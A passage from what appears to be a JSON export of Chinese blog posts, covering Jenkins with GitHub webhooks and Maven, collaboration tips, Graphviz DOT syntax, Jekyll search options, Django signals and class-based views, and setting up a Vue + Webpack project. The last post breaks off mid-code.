Apache Tomcat 一样）。它支持软件配置管理工具（包括AccuRev SCM、CVS、Subversion、Git、Perforce、Clearcase和RTC），可以执行基于Apache Ant 和 Apache Maven 的项目，以及任意的 Shell 脚本和 Windows 批处理命令。\n2.2 下载安装 如果在本地 本地 安装 Java 允许环境，然后去 http://mirrors.jenkins-ci.org/war-stable/ 下载最新版本的 jenkins.war 文件。执行如下命令：\n1 java -jar jenkins.war 即可在本地，http://127.0.0.1:8080，访问 Jenkins 服务。\n如果在服务器 通常，会通过 Nginx 代理请求，这里以 Ubuntu 系统为例，介绍如何配置和安装。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 查看 nginx 的配置文件地址 nginx -t # 编辑显示的配置文件，新增如下内容： server { listen 80; server_name jenkins.domain.com; access_log /var/log/jenkins.access.log ; error_log /var/log/jenkins.error.log ; client_max_body_size 60M; client_body_buffer_size 512k; location / { port_in_redirect on; proxy_pass http://127.0.0.1:8080$request_uri; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } # Nginx 重新加载配置文件 nginx -s reload 安装 Jenkins\n1 2 3 4 wget -q -O - https://pkg.jenkins.io/debian/jenkins-ci.org.key | sudo apt-key add - sh -c \u0026#39;echo deb http://pkg.jenkins.io/debian-stable binary/ \u0026gt; /etc/apt/sources.list.d/jenkins.list\u0026#39; apt-get update apt-get install jenkins 启动 Jenkins\n1 jenkins start 还有 exit，restart，reload，可以使用。\n最后别忘了 配置 DNS，将 jenkins.domain.com 解析到 服务器 IP，即可 通过 jenkins.domain.com 域名访问 Jenkins 服务了。\n2.3 插件安装和配置 第一次启动时，Jenkins 会自动生成一个随机字符串。根据页面提示的文件路径，找到该字符串，输入即可。 接着，会有提示安装推荐的插件。如果选择安装，那么常用的一些插件会被自动安装上。\nJenkins 有着丰富的第三方插件，和其他工具进行深度的集成。正是这些插件，使得 Jenkins 的能集成的功能越来越多、满足各种定制化的需求。\n有两种方法可以安装插件， 在 Manage Jenkins - \u0026gt; Manage Plugins：\navailable 标签下，可以勾选需要安装的插件安装。 advanced 标签下，可以上传离线的插件进行安装。 Jenkins中，创建新的 Item 有如下类型：\nFreestyle project，基础功能，用来执行各种构建任务 Job。 Pipeline，用来组装很多 Job 的执行流程。 External job，用来监视外部执行的 Job。 Multi-configuration project ，让 Job 跑在不同的机器上。 Folder，创建一个文件视图，用于归档 GitHub Organization，搜索 GitHub 项目 Multibranch Pipeline，创建一组管道项目 2.4 中文显示 Jenkins 的 Web 页面，默认会从浏览器设置中获取当前语言设置。有两种方式可以中文化：\n设置浏览器语言为中文 在 【设置】-【高级】- 【语言】选项中，新增 【中文（简体）】\n安装插件 Locale Plugin\n1.在【Manage Jenkins】-【Manage Plugins】-【Available】中找到 Locale Plugin 插件，勾选安装，重启生效。\n2.在【Manage Jenkins】-【Configure System】中，找到 【Locale】- 【Default Language】设置为 zh_CN ，勾选 Ignore browser preference and force this language to all users，点击【Apply】即可。\n2.5 Jenkins API Jenkins 提供了 html、json、Python API，实质都是以 http get/post 方式调用的。查看 http://jenkins.domain.com/api/ , 即可得到相应的说明。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # 1.创建 curl -X POST http://www.xxx.xxx/jenkins/createItem?name=JavaStd --user peterguo:peterguo --data-binary \u0026#34;@javastd.config.xml\u0026#34; -H \u0026#34;Content-Type: text/xml\u0026#34; # 2.禁用 curl -X POST http://www.xxx.xxx/jenkins/job/JavaStd/disable --user peterguo:peterguo # 3.启用 curl -X POST http://www.xxx.xxx/jenkins/job/JavaStd/enable --user peterguo:peterguo # 4.删除 curl -X POST http://www.xxx.xxx/jenkins/job/JavaStd/doDelete --user peterguo:peterguo # 5.获取项目描述 curl -X GET http://www.xxx.xxx/jenkins/job/JavaStd/description --user peterguo:peterguo # 6.获取配置文件 curl -X GET http://www.xxx.xxx/jenkins/job/JavaStd/config.xml --user peterguo:peterguo # 7.触发SCM检查 curl -X GET http://www.xxx.xxx/jenkins/job/JavaStd/polling --user peterguo:peterguo # 8.普通触发 curl -X GET http://www.xxx.xxx/jenkins/job/JavaStd/build --user peterguo:peterguo # 9.带参数触发 curl -X GET \u0026#34;http://www.xxx.xxx/jenkins/job/helloworld-freestyle/buildWithParameters?bAllTest=\u0026amp;Choices=2\u0026amp;strParam=abc\u0026#34; --user peterguo:peterguo 3. Jenkins 集成 GitHub 这部分，主要描述如何利用 GitHub 的 WebHooK 触发 Jenkins 构建任务。这里以 Java 项目常用的 Maven 构建工具为例。\n3.1 关于 Maven Maven 和 make 一样，是个构建工具，将源代码转换为可执行的代码。Maven 使用配置文件 pom.xml 对环境进行配置，例如设定编译器的版本，设定所需支持包的 URL ，这样 maven 就可以自动去下载所需的包。如果需要对构建环境进行改变时，直接改变 pom.xml 文件就可以了，maven 会自动下载配置包。\nMaven 比 make 的更强大的地方是，可以利用其他工具，实现对编译结果的统计，对源代码的检查，对于代码的测试等。例如 checkstyle，cobertura 等都有对应的 Maven 插件。\nMaven 控制编译，控制连接，生成各种报告，进行代码测试，而 Jenkins 控制这个流程。\n3.2 GitHub 设置 Personal Access Token 进入GitHub 主页，在【settings】-【Personal Access Token页面，点击 【Generate new token】\n勾选 【repo】 和 【admin:repo_hook】，生成 Token。注意这里的，Token，只会显示一次，之后如果丢失了，就需要重新生成。\nWebHook 新建一个 GitHub 项目，在【Settings】-【Webhooks】页面，点击【Add webhook】，【Payload URL】参数填入：http://jenkins.domain.com/github-webhook/ ，在【Content type】参数选择：application/json，保存即可。\n初始化项目\n为了能够快速的验证 GitHub 的 WebHook 能够触发 Jenkins 的构建任务，建议直接找一个比较简单的开源 Maven 项目。下面是实例的代码结构： 1 2 my-app/src/ my-app/pom.xml 3.3 Jenkins 插件和服务器环境配置 服务器环境 1 2 apt-get install git apt-get install maven2 Jenkins 插件安装 需要安装插件 Maven Integration plugin，GitHub Plugin\n3.4 Jenkins 系统配置 在【系统管理】- 【系统设置】里面\n设置 TOKEN: 找到 【GitHub】选项，点击 【Add GitHub Server】，将 Token 填入图中，红色框中，其他设置如图所选。 在【系统管理】- 【Global Tool Configuration】里面设置 Git 和 Maven 的安装地址，由于 git 和 mvn 命令都已经添加到了 PATH 中，这里只需要设置为 default 即可。\n3.5 创建 Maven 项目 点击【新建】，选择 【构建一个 maven 项目】，输入项目名称。\n选择为【GitHub project】，设置为在 GitHub 上新建项目的 URL 地址。\n选择【源码管理】为 Git，并设置项目地址，这里需要新增用户名和密码。\n设置【构建触发器】，是为了告知 Jenkins 在何种情况执行构建。这里，选择【GitHub hook tigger for GITScm polling】，也就是通过代码提交时，产生的 WebHook 事件触发。\n【Build】设置告知 Maven 项目的 POM.xml 文件位置，如果找不到该文件，Jenkins 会有提示。\n3.5 触发构建 在GitHub 上提交代码：\n1 2 3 git add * git commit -m \u0026#39;Update pom.xml\u0026#39; git push origin master 将触发构建任务执行。\n执行完毕，在【Console Output】可以看到执行的详细情况。\n在【状态集】可以看到构建的状态信息。\n在【Module Builds】中，点击【my-app】，可以看到构建产生的文件。\n将构建文件下载到本地，执行。\n4. 参考 https://zh.wikipedia.org/wiki/Jenkins_(%E8%BD%AF%E4%BB%B6) https://wiki.jenkins.io/display/JENKINS/Installing+Jenkins+on+Ubuntu http://www.jianshu.com/p/22b7860b4e81 https://wiki.jenkins.io/display/JENKINS/Locale+Plugin http://books.xueboren.com/linux/zh-cn/ServersInstallAndConfig/Jenkins/Jenkins-xbooks.html http://files.cnblogs.com/files/itech/Jenkins%E5%85%A5%E9%97%A8.pdf ","description":"","id":531,"section":"post","tags":["博文","工具","开发","Jenkins","GitHub","DevOps"],"title":"Jenkins 集成 GitHub 开发","uri":"https://www.chenshaowen.com/blog/jenkins-integrated-github-development.html"},{"content":" 合作是一场旅程。\n1. 跨部门合作的障碍 对新业务合作的抵触 职责存在模糊地带 员工的合作能力 信息不对称 跨部门合作的管理机制 目标和利益不一致 资源有限 2. 合作的核心理念 双赢思维 开放心态 合作核心的三个方面\n寻找共同利益 学会换位思考 巩固长期合作关系 3. 合作关系核心 长期合作最重要的品质 - 坚持不懈\n3.1 着眼长远 不计较单次合作的得与失 着眼长期合作信任关系 只有在长期、重复的博弈中才能建立稳固的合作关系 3.2 持之以恒 可靠守信 接纳宽容 坦诚开放 诚实一致 第一品质：坚持不懈 3.3 巩固长期合作信心的常见方法 成功后，及时总结并致谢合作伙伴 失败后，找出原因，采取建设性的行动 所有过程中，给情感账户投资，扩大人脉影响圈 4. 寻找利益共同点 影响对方的能力，特别是获得对方合作的愿望，很大程度上取决于对方是否认为你愿意帮助其满足其需求。\n前提条件，共同利益：\n找出共同利益，足够的共同利益可以跟任何人建立关系 冒点风险，率先把自己暴露在对方面前 任何情况下，都设法达成尽可能长久的协议 5. 有利于合作的有效动作讨论 明确KPI 克服异地，勤打电话。面对面 \u0026gt; 打电话 \u0026gt; QQ\\WeiXin 及时响应，不拖拉 明确风险 吃饭等线下活动，了解性格和行为方式，增进情感 仪式感，使命感，成立联合项目组等 明确流程 6. 合作沟通技巧讨论 要求合作方：\n告知优点，用点营销的小技巧 XX也同意，从众心里 有啥难点交给我，主动承担 面谈，PPT，效率更高 明确时间 不找Boss，避免关系破裂 前期讨论，暴露风险 分析共同利益，以求合作 合作配合方：\n主动表达接受或拒绝，给出理由 合作流程化 无条件建设态度 注意己方的态度 ","description":"","id":532,"section":"post","tags":["管理","合作","研发"],"title":"跨部门合作课程笔记","uri":"https://www.chenshaowen.com/blog/cross-departmental-collaborative-curriculum-notes.html"},{"content":"1. 简介 Graphviz是贝尔实验室开发的一个开源的绘图工具包。它使用一个特定的DSL（领域特定语言）: DOT作为脚本语言。使用布局引擎来解析DOT脚本，完成自动布局。支持丰富的导出格式，例如：PNG、JPG、PostScript、SVG、PDF等。\n支持的布局引擎：\ndot 默认布局方式，主要用于有向图 neato 基于spring-model(又称force-based)算法布局 twopi 放射状布局 circo 圆环布局 fdp 无向图布局 编译命令为:\n1 ＜cmd＞ ＜inputfile＞ -T ＜format＞ -o ＜outputfile＞ 其中Graphviz 的 cmd 有好几种，每种使用方法都完全相同，差别只在于渲染出来的图片效果不一样。cmd可选项[dot、neato、twopi、circo、fdp]，也就是上面的布局引擎。\n使用 dot 命令编译，如\n1 dot hello.dot -T png -o hello.png 2. DOT语法特征 DOT语法相对简单，没有特殊的格式要求，也没有复杂的运算符和结构。Graphviz图形主要由节点、边、标注组成。\n2.1 语法关键字 注释，使用//注释 有向图 - 使用digraph定义有向图 有向图 - 使用-\u0026gt;表述节点之间的关系 无向图 - 使用graph定义无向图 无向图 - 使用 \u0026ndash; 表述节点之间的关系 节点之间的关系 - 有向图：a -\u0026gt; b，a节点指向b节点 节点之间的关系 - 无向图：a \u0026ndash; b， a节点与b节点连通 定义节点属性 - 格式为: node[attribute1=value1, attribute2=value2] 子图 - 使用subgraph定义子图 2.2 通用属性 属性名称 默认值 含义 color black 颜色 colorscheme X11 颜色描述 fontcolor black 文字颜色 fontname Times-Roman 字体 fontsize 14 文字大小 label 显示的标签，对于节点默认为节点名称 penwidth 1.0 线条宽度 style 样式 weight 重要性 2.3 图的属性 属性名称 默认值 含义 bgcolor 背景颜色 concentrate false 让多条边有公共部分 nodesep .25 节点之间的间隔（英寸） peripheries 1 边界数 rank same,min,source, max,sink，设置多个节点顺序 rankdir TB 排序方向 ranksep .75 间隔 size 图的大小（英寸） 2.4 节点属性 属性名称 默认值 含义 shape ellipse 形状 sides 4 当shape=polygon时的边数 fillcolor lightgrey/black 填充颜色 fixedsize false 标签是否影响节点的大小 2.5 边属性 属性名称 默认值 含义 arrowhead normal 箭头头部形状 arrowsize 1.0 箭头大小 arrowtail normal 箭头尾部形状 constraint true 是否根据边来影响节点的排序 decorate 设置之后会用一条线来连接edge和label dir forward 设置方向：forward,back,both,none headclip true 是否到边界为止 tailclip true 与headclip类似 3. 实例 3.1 流程图 源代码 digraph G { subgraph cluster_0 { node [style=filled,color=yellow]; //设置节点属性 edge [color = \u0026#34;green\u0026#34;, decorate = false]; //设置边属性 a0 -\u0026gt; a1;//连接信息 label = \u0026#34;#1\u0026#34;;//标签 } subgraph cluster_1 { node [style=filled]; b0 -\u0026gt; b1; label = \u0026#34;#2\u0026#34;; } start -\u0026gt; {a0,b0}; {a1,b1} -\u0026gt; end; start [shape=Mdiamond];//设置节点图形 end [shape=Msquare]; } 生成的图形 3.2 结构图 源代码 digraph G { main -\u0026gt; parse -\u0026gt; execute; main -\u0026gt; init; main -\u0026gt; cleanup; execute -\u0026gt; make_string; execute -\u0026gt; printf; init -\u0026gt; make_string; main -\u0026gt; printf; execute -\u0026gt; compare; } 生成的图形 3.3 数据结构图 源代码 digraph g { node [shape = record,height=.1]; node0[label = \u0026#34;\u0026lt;f0\u0026gt; |\u0026lt;f1\u0026gt; G|\u0026lt;f2\u0026gt; \u0026#34;]; node1[label = \u0026#34;\u0026lt;f0\u0026gt; |\u0026lt;f1\u0026gt; E|\u0026lt;f2\u0026gt; \u0026#34;]; node2[label = \u0026#34;\u0026lt;f0\u0026gt; |\u0026lt;f1\u0026gt; B|\u0026lt;f2\u0026gt; \u0026#34;]; node3[label = \u0026#34;\u0026lt;f0\u0026gt; |\u0026lt;f1\u0026gt; F|\u0026lt;f2\u0026gt; \u0026#34;]; node4[label = \u0026#34;\u0026lt;f0\u0026gt; |\u0026lt;f1\u0026gt; R|\u0026lt;f2\u0026gt; \u0026#34;]; node5[label = \u0026#34;\u0026lt;f0\u0026gt; |\u0026lt;f1\u0026gt; H|\u0026lt;f2\u0026gt; \u0026#34;]; node6[label = \u0026#34;\u0026lt;f0\u0026gt; |\u0026lt;f1\u0026gt; Y|\u0026lt;f2\u0026gt; \u0026#34;]; node7[label = \u0026#34;\u0026lt;f0\u0026gt; |\u0026lt;f1\u0026gt; A|\u0026lt;f2\u0026gt; \u0026#34;]; node8[label = \u0026#34;\u0026lt;f0\u0026gt; |\u0026lt;f1\u0026gt; C|\u0026lt;f2\u0026gt; \u0026#34;]; \u0026#34;node0\u0026#34;:f2 -\u0026gt; \u0026#34;node4\u0026#34;:f1; \u0026#34;node0\u0026#34;:f0 -\u0026gt; \u0026#34;node1\u0026#34;:f1; \u0026#34;node1\u0026#34;:f0 -\u0026gt; \u0026#34;node2\u0026#34;:f1; \u0026#34;node1\u0026#34;:f2 -\u0026gt; \u0026#34;node3\u0026#34;:f1; \u0026#34;node2\u0026#34;:f2 -\u0026gt; \u0026#34;node8\u0026#34;:f1; \u0026#34;node2\u0026#34;:f0 -\u0026gt; \u0026#34;node7\u0026#34;:f1; \u0026#34;node4\u0026#34;:f2 -\u0026gt; \u0026#34;node6\u0026#34;:f1; \u0026#34;node4\u0026#34;:f0 -\u0026gt; \u0026#34;node5\u0026#34;:f1; } 生成的图形 4. 前端集成 前端整合 Graphviz，主要是通过 Viz.js，将文本内容转化为图片，然后动态添加到页面实现的。这里有一段 JavaScript，获取标签的文本内容，并在标签同一级插入 Viz.js 生成的图片。\n新增转换脚本 1 2 3 4 5 6 7 8 9 \u0026lt;script src=\u0026#34;https://cdn.bootcss.com/viz.js/1.8.0/viz.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; // add graphviz support $(\u0026#39;.gcode\u0026#39;).each(function(){ var gcodeNode = document.createElement(\u0026#39;span\u0026#39;); gcodeNode.innerHTML = Viz(this.innerText); this.append(gcodeNode ); }); \u0026lt;/script\u0026gt; 利用gcode标签，插入DOT脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;p\u0026gt;\u0026lt;script type=\u0026#34;text/vnd.graphviz\u0026#34; class=\u0026#34;gcode\u0026#34;\u0026gt; graph G { e subgraph clusterA { a -- b; subgraph clusterC { C -- D; } } subgraph clusterB { d -- f } d -- D e -- clusterB clusterC -- clusterB } \u0026lt;/script\u0026gt;\u0026lt;/p\u0026gt; 生成的图片内容 5. 参考 1.http://www.graphviz.org/Download.php 2.https://zh.wikipedia.org/zh-hans/Graphviz 3.https://github.com/mdaines/viz.js/ 4.http://viz-js.com/ ","description":"","id":533,"section":"post","tags":["博文","图","工具","Graphviz","绘图"],"title":"Graphviz 工具包 DOT 绘图","uri":"https://www.chenshaowen.com/blog/drawing-toolkit-of-dot-using-graphviz.html"},{"content":"简介：Jekyll是一套静态HTML生成工具。文档系统利用Jekyll进行部署，最终将Markdown转换为HTML文件输出。\n搜索功能的需求是，根据关键字，匹配文档的标题或者内容，列出匹配的文档列表。\n1. 方案一： Simple-Jekyll-Search 参考地址：https://github.com/christian-fei/Simple-Jekyll-Search\n搜索范围：文章标题\n方案实施：\nDemo下通过配置参数，生成标题+URL的元数据search.json。 前端利用关键字，匹配search.json中文章标题，显示搜索列表。 优点：后端有simple-jekyll-search可用，前端有jekyll-search.js可用。成本低。\n缺点：仅能搜索文章标题，即使能搜索Tags和Keywords，也不太够。\n2. 方案二： Searchyll+Elasticsearch 参考地址：http://allizad.com/2016/05/06/elasticserch-for-jekyll/\n搜索范围：文章内容\n方案实施：\n本地起一个Elasticsearch服务。 安装Searchyll，在生成静态文件阶段，利用Hook，将完整HTML发送给Elasticsearch。 前端将请求关键字发给Elasticsearch，返回列表显示。 优点：搜索范围广，基本能满足需求。即使文章很多时，搜索性能也不会受太大影响。国外的Jekyll站点，很多使用的是第三方提供的Elasticsearch服务。\n缺点：需要新增一个服务，有一定的维护成本。\n3. 方案三： 文件入库定制搜索 搜索范围：文章内容+标题\n方案实施：\nPython静态页面入库 前端发送关键字给后端，后端在数据库查询，返回匹配的文章列表 优点：可以定制化搜索。\n缺点：文档更新频繁，需要同步刷新数据。\n","description":"","id":534,"section":"post","tags":["博文","Jekyll","方案","数据"],"title":"Jekyll 搜索方案","uri":"https://www.chenshaowen.com/blog/jekyll-search-option.html"},{"content":"1. 基本概念 Django内置了一个信号分发器。信号可以帮助解耦程序模块。在应用中其他地方发生某事件时，通知指定函数。信号允许某些 senders 通知一组 receivers 已经发生的行为。\n2. 信号使用 2.1 声明信号 在使用信号之前，首先得创建信号实例，声明信号的接收参数列表。django.dispatch.Signal是Django提供的信号类，其构造方法接收一个参数providing_args，指明信号包含的参数。\n1 2 3 from django.dispatch import Signal # 声明一个名为mysignal的信号实例 mysignal=Signal(providing_args=[\u0026#39;user\u0026#39;]) 2.2 发送信号 当需要通知接收者处理信号时，首先需要发送者发送一个signal。Signal类提供了两种方法，用于发送信号。\n1 2 Signal.send(sender, **named) Signal.send_robust(sender, **named) 两种方法都返回一个含有二元组的列表 [(receiver, response), \u0026hellip; ]，表示全部的接收函数和响应值。不同之处在于异常处理部分，send( )不会捕捉receiver产生的异常，而send_robust( )会。\n1 2 3 4 def home(request): mysignal.send(sender=None,user=request.user) # send方法第一个参数为sender，可以是对象.__class__、self、直接类名 return HttpResponseNotAllowed(\u0026#39;\u0026#39;) 2.3 关联处理函数 第一种，使用connect方法。\n1 Signal.connect(receiver, sender=None, weak=True, dispatch_uid=None) receiver：signal的接收者 sender：signal的发送者 weak：Django默认将signal处理器当成弱引用存储。因此，如果接收函数是本地函数的话，有可能被垃圾回收。为防止这种情况，需要指定weak=False。 dispatch_uid：信号有可能重复发送的情况下，信号处理器的唯一标识 定义一个receiver(也可以说是一个call_back函数)： 1 mysignal.connect(record) 第二种，使用装饰器。\n1 2 3 4 5 6 from django.dispatch import receiver @receiver(mysignal) def record(sender,user,**kwargs): #执行函数第一个参数为sender print user.username 通过装饰器修饰，可以指定信号的处理函数。receiver也接受sender参数，仅处理指定发送者的信号。\n第三种，使用dispatcher。\n1 2 3 from django.db.models.signals import post_save from django.dispatch import dispatcher dispatcher.connect(receiver=record, signal=post_save, sender=Mymodel) dispatcher显式的指出了处理函数，信号，发送者。\n2.3 处理信号 信号的处理是通过调用处理函数实现的。\n1 2 def callback_func(sender, **kwargs): pass 所有的信号处理函数，都必须接收一个sender参数，以及通配符关键字参数（**kwargs）\n2.4 断开信号 1 Signal.disconnect(receiver=None, sender=None, weak=True, dispatch_uid=None): 如果接收器成功断开，返回 True ，否则返回False。\n3. Django内置信号 Django内置的信号是已经实例化的Signal类。在使用时，省掉了声明信号，发送信号两个流程。将Django内置的信号直接关联上自定义的处理函数，即可使用。下面是Django内置信号列表：\ndjango.db.models.signals\n1 2 3 4 5 6 7 8 9 10 11 12 pre_init # django的modal执行其构造方法前，自动触发 post_init # django的modal执行其构造方法后，自动触发 pre_save # django的modal对象保存前，自动触发 post_save # django的modal对象保存后，自动触发 pre_delete # django的modal对象删除前，自动触发 post_delete # django的modal对象删除后，自动触发 m2m_changed # django的modal中使用m2m字段操作第三张表（add,remove,clear）前后，自动触发 class_prepared # 程序启动时，检测已注册的app中modal类，对于每一个类，自动触发 pre_migrate # 执行migrate命令前，自动触发 post_migrate # 执行migrate命令后，自动触发 pre_syncdb # 执行syncdb命令前，自动触发 post_syncdb # 执行syncdb命令后，自动触发 django.core.signals\n1 2 3 4 request_started # 请求到来前，自动触发 request_finished # 请求结束后，自动触发 got_request_exception # 请求异常后，自动触发 setting_changed # settings发生改变时，自动触发 django.test.signals\n1 template_rendered # 使用test测试渲染模板时，自动触发 django.db.backends.signals\n1 connection_created # 创建数据库连接时，自动触发 例如，需要在每次完成请求后，进行某些操作，可以这样写：\n1 2 3 4 5 from django.core.signals import request_finished from django.dispatch import receiver @receiver(request_finished) def callback_func(sender,**kwargs): print(\u0026#39;request finished\u0026#39;) 4. 参考 1.http://python.usyiyi.cn/translate/django_182/topics/signals.html 2.http://lilongzi.blog.51cto.com/5519072/1906557 ","description":"","id":535,"section":"post","tags":["博文","Django","后端","Python"],"title":"Django 信号","uri":"https://www.chenshaowen.com/blog/signal-of-django.html"},{"content":"1，初始化项目 vue-cli 是Vue官方发布的项目脚手架，使用 vue-cli 可以快速创建 Vue + Webpack项目。\n1 2 3 4 5 6 7 8 9 10 npm install -g vue-cli # 全局安装vue-cli vue init webpack myproject # 创建vue项目，执行时，会提示输入项目的相关信息 cd myproject # 进入项目 npm install # 安装依赖包，新建node_modules文件夹，依赖包安装在此 npm run dev # 本地运行，默认在http://localhost:8080，启动服务 2，目录结构说明 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 |--build //webpack相关代码文件夹 | |--build.js //生产环境结构代码 | |--check-version.js //检查node、npm等版本 | |--dev-client.js //热加载相关代码 | |--dev-server.js //本地服务器 | |--utils.js //构建工具 | |--vue-loader.conf.js //vue加载器 | |--webpack.base.conf.js //webpack基本配置 | |--webpack.dev.conf.js //webpack开发环境配置 | |--webpack.test.conf.js //webpack测试环境配置 | |--webpack.prod.conf.js //webpack生产环境配置 |--config //项目开发环境配置 | |--index.js //项目基本配置 | |--dev.env.js //开发环境变量 | |--test.env.js //测试环境变量 | |--prod.env.js //生产环境变量 |--src //项目源代码目录 | |--assets //资源目录 | |--components //组件目录 | |--router //路由目录 | |--APP.vue //页面入口文件 | |--main.js //程序入口文件，加载各种公共组件 |--static //静态文件目录，比如：css、图片等静态文件 |--index.html //入口文件 |--test //单元测试文件目录 |--package.json //项目基本信息 |--README.md //项目说明 3，新增一个页面 下面以增加一个页面为例，说明开发流程。\n3.1，增加页面模板 在src/compoents目录下，新建文件Home.vue作为/home 路由的显示页面。\nHome.Vue\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;home\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;{{ msg }}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data () { return { msg: \u0026#39;I am Home Page\u0026#39; } } } \u0026lt;/script\u0026gt; \u0026lt;style scoped\u0026gt; h1, h2 { font-weight: normal; } \u0026lt;/style\u0026gt; 渲染页面模板，主要分为三个部分：\ntemplate。HTMLDom结构，页面显示的内容。 script。Vue的逻辑代码，前端js。 style。样式内容，scoped表示仅在本模板生效。 3.2，增加页面路由 在src/router目录下，index.js中新增如下内容。\nindex.js新增\n1 2 3 4 5 6 7 8 9 10 11 import Home from \u0026#39;@/components/Home\u0026#39; export default new Router({ routes: [ { path: \u0026#39;/home\u0026#39;, name: \u0026#39;home\u0026#39;, component: Home } ] }) 这样 http://localhost:8080/#/home ，就路由到了Home.vue页面了。需要注意的是，这里的路由是从#后面开始的。\n4，打包编译 在项目目录下，利用npm，执行build即可完成生产环节的打包编译。\n1 2 cd myproject npm run build 打包生成的文件输出路径，在config/index.js的assetsRoot、assetsSubDirectory参数中指定\n1 2 3 4 5 6 7 8 9 10 11 12 13 dist |-- index.html `-- static |-- css | |-- app.css # 样式 | `-- app.css.map `-- js |-- app.js # 主要是vue模板编译后的内容 |-- app.js.map |-- manifest.js #在vendor的基础上，再抽取出要经常变动的部分，比如关于异步加载js模块部分的内容 |-- manifest.js.map |-- vendor.js # 通过提取公共模块插件来提取的代码块（webpack本身带的模块化代码部分） `-- vendor.js.map 关于map文件：在开启了控制台（F12）的时候，才会加载.map文件。通常生产环境的js和css代码，经过压缩，一个文件可能只有几行代码，但是每行却有几千字符。这样非常不利于代码调试，map文件就是用来调试代码，定位代码行的。\n","description":"","id":536,"section":"post","tags":["博文","前端","工具","Vue","Webpack"],"title":"Vue + Webpack 开发","uri":"https://www.chenshaowen.com/blog/101-of-vue-and-webpack-project.html"},{"content":" Django中有两种视图，一种是函数式视图，另一种是类视图。视图的作用主要是，用于填充逻辑，返回响应体。函数式视图难以扩展，代码复用率低。而类视图可以利用继承、Mixins，快速复用、扩展功能。本文主要讨论了，Django对类视图的处理逻辑，类视图装饰器实现。\n1. Django的视图 Django的URL解析器，将一个HttpRequest对象和相应的参数传递给一个可调用的函数，并期待其返回一个HttpResponse对象。这个可调用的函数，就是视图函数。\n1.1 函数式视图 views.py\n1 2 3 4 5 6 7 8 9 from django.http import HttpResponse def my_view(request): if request.method == \u0026#39;GET\u0026#39;: # 填充逻辑 return HttpResponse(\u0026#39;result\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: # 填充逻辑 return HttpResponse(\u0026#39;result\u0026#39;) urls.py\n1 2 3 4 5 6 7 # urls.py from django.conf.urls import patterns import .views as home_view urlpatterns = patterns(\u0026#39;\u0026#39;, (r\u0026#39;^my_view/\u0026#39;, home_view.my_view) ) 函数式视图（FBV）只使用在定制错误，或那些使用类视图实现时会很复杂的情况。\n1.2 类视图 views.py\n1 2 3 4 5 6 7 8 9 10 from django.http import HttpResponse from django.views.generic.base import View class MyView(View): def get(self, request): # 填充逻辑 return HttpResponse(\u0026#39;result\u0026#39;) def post(self, request): # 填充逻辑 return HttpResponse(\u0026#39;result\u0026#39;) urls.py\n1 2 3 4 5 6 7 # urls.py from django.conf.urls import patterns from .views import MyView urlpatterns = patterns(\u0026#39;\u0026#39;, (r\u0026#39;^about/\u0026#39;, MyView.as_view()), ) 为了解耦视图和URL、代码复用，Django提供了类视图。\n类视图（CBV）提供了一个as_view()静态方法，调用该方法，会创建一个类的实例。然后调用实例的dispatch()方法，dispatch()方法会根据request的请求类型，调用相应实例的同名方法。如果没有找到对应的方法，将引发一个HttpResponseNotAllowed异常。\nDjango提供的一系列类视图类，都继承自一个View基类（django.views.generic.base.View），在这个基类里实现了与 URL的接口（as_view）、请求方法匹配（dispatch）和一些其他的基本功能。比如 ，RedirectView 实现了 HTTP 重定向，TemplateView 新增了渲染模板的方法。\ndjango.views.generic.base.py 中View类as_view和dispatch方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @classonlymethod def as_view(cls, **initkwargs): for key in initkwargs: if key in cls.http_method_names: raise TypeError(\u0026#34;You tried to pass in the %s method name as a \u0026#34; \u0026#34;keyword argument to %s(). Don\u0026#39;t do that.\u0026#34; % (key, cls.__name__)) if not hasattr(cls, key): raise TypeError(\u0026#34;%s() received an invalid keyword %r. as_view \u0026#34; \u0026#34;only accepts arguments that are already \u0026#34; \u0026#34;attributes of the class.\u0026#34; % (cls.__name__, key)) def view(request, *args, **kwargs): self = cls(**initkwargs) if hasattr(self, \u0026#39;get\u0026#39;) and not hasattr(self, \u0026#39;head\u0026#39;): self.head = self.get self.request = request self.args = args self.kwargs = kwargs return self.dispatch(request, *args, **kwargs) update_wrapper(view, cls, updated=()) update_wrapper(view, cls.dispatch, assigned=()) return view def dispatch(self, request, *args, **kwargs): if request.method.lower() in self.http_method_names: handler = getattr(self, request.method.lower(), self.http_method_not_allowed) else: handler = self.http_method_not_allowed return handler(request, *args, **kwargs) 2. Django视图Mixin类 Django将基本的HTTP请求和响应，抽象封装成类。在使用过程中，只需要将这些基类聚合，按照需求的方式重写或者直接复用。这些基类称之为Mixin。\n在django.views.generic包中，除了base提供了构成cbv最基础的几个Mixin，以及cbv的基类View，还提供了四个模块，\ndetail，显示详细数据，SingleObjectMixin，SingleObjectTemplateResponseMixin list，显示列表，MultipleObjectMixin，MultipleObjectTemplateResponseMixin edit，提供新增和编辑的功能，DeletionMixin，FormMixin， dates，年月日相关的显示和获取，YearMixin, MonthMixin, DayMixin, WeekMixin, DateMixin 一个View Class可以继承多个Mixin，但是只能继承一个View（包括其子类）。\n3. 类视图装饰器 3.1 修饰dispatch dispatch装饰器，将影响到全部的视图类方法函数。Django 1.9开始method_decorator支持name参数，可以指定方法，例如，name=\u0026lsquo;get\u0026rsquo;，表示仅修饰get函数。如果有多个装饰器需要配置，@method_decorator也接受列表参数，可以同时装配多个装饰器。\n1 2 3 4 5 6 7 8 from django.contrib.auth.decorators import login_required from 